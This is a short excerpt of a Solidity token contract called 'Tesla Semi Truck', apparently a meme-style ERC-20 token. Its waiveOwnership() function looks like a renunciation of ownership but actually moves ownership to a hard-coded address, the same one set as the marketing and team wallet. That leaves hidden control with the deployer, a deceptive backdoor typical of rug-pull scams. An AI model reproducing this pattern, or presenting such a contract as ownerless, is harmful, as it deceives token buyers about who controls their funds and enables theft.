...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x0D5f5F105B8b48101D8b841F9cca75BB087fB5a8));
        _owner = address(0x0D5f5F105B8b48101D8b841F9cca75BB087fB5a8);
    }
...
contract TeslaSemiTruck is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Tesla Semi Truck";
    string private _symbol = "TESLA SEMI TRUCK";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0D5f5F105B8b48101D8b841F9cca75BB087fB5a8);
    address payable public teamWalletAddress = payable(0x0D5f5F105B8b48101D8b841F9cca75BB087fB5a8);
